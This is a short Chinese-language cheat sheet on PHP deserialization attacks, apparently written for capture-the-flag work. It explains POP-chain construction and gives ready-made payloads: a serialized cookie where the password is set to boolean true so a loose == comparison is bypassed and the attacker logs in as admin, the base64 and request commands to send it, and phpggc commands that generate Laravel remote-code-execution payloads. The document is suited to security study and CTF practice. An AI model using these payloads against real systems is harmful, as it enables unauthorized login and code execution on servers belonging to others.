# PHP 反序列化详解

## 序列化格式
```
O:类名长度:"类名":属性数:{s:属性名长度:"属性名";类型:值;...}
```
示例：`O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}`

## 常见魔术方法利用链 (POP Chain)
- `__wakeup()` — unserialize() 后立即调用
- `__destruct()` — 对象销毁时调用
- `__toString()` — 对象被当作字符串时调用
- `__call()` — 调用不存在的方法时触发

**POP Chain 构造思路**：
1. 找到入口类（有 `__wakeup`/`__destruct`）
2. 找到文件操作类（有 `file_get_contents`/`file_put_contents`）
3. 通过属性赋值将入口类的方法调用链接到文件操作类
4. **读源码是关键**：用 LFI 或信息泄露获取 PHP 源码，分析类定义

## ⚠️ 反序列化 + Type Juggling 绕过（`b:1` Cookie 攻击）

**典型场景**：Cookie 中存储序列化登录凭据，`unserialize()` 后用 `==` 比较密码
```
# 原始序列化（正常登录）：
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"12345";}

# Type Juggling 绕过：将 password 改为 boolean true
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}
```
`b:1` 是 PHP 序列化的 `true`，`true == "任何密码字符串"` 在松散比较下为 true。

**攻击步骤**：
1. POST 登录观察 Set-Cookie（常见 cookie 名：`creds`, `auth`, `session`, `user`）
2. Base64 解码 cookie 值，识别 PHP 序列化格式 `a:N:{...}` 或 `O:N:"..."`
3. 将密码字段改为 `b:1;`（boolean true），重新 base64 编码
4. 用修改后的 cookie 访问目标

```
# 生成 payload
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}' | base64
# 发送 payload
http_request url="http://target/" headers={"Cookie":"creds=<base64_payload>"}
```

## phpggc 工具（自动化 POP Chain）
```
phpggc -l                    # 列出支持的框架
phpggc Laravel/RCE1 system 'cat /flag.txt' | base64  # 生成payload
```
常见框架支持：Laravel, Symfony, Yii, WordPress, Drupal, Magento
